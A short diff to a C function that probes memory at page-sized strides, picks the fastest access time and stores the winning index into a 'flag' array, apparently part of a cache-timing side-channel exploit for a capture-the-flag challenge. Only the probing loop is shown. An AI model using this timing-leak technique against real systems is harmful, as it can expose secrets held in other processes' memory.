@@ -28,7 +28,7 @@ void mem(int index)
     sleep(1);
     unsigned long long start, finish, min_re = -1, re;
     char i_dont_care;
-    unsigned long long *time = (unsigned long long*)(ptr + 0x1000);
+    //unsigned long long *time = (unsigned long long*)(ptr + 0x1000);
 
     for (int i = 0x4; i < 0x80; i++)
     {
@@ -46,15 +46,16 @@ void mem(int index)
         //     min_re = re;
         //     flag[index] = i - 1;
         // }
-        if(time[i] < min_re)
+        unsigned long long *time = (unsigned long long*)(&ptr[(i+1)*0x1000]);
+        if(time[0] < min_re)
         {
-            min_re = time[i];
+            min_re = time[0];
             flag[index] = i;
         }
-        //printf("find: %d\tindex: %d\ttime: %llu\n", index, i, time[i]);
+        printf("find: %d\tindex: %d\ttime: %llu\n", index, i, time[0]);
         
     }
-    putchar(flag[index]);
+    //putchar(flag[index]);
 
 
 }
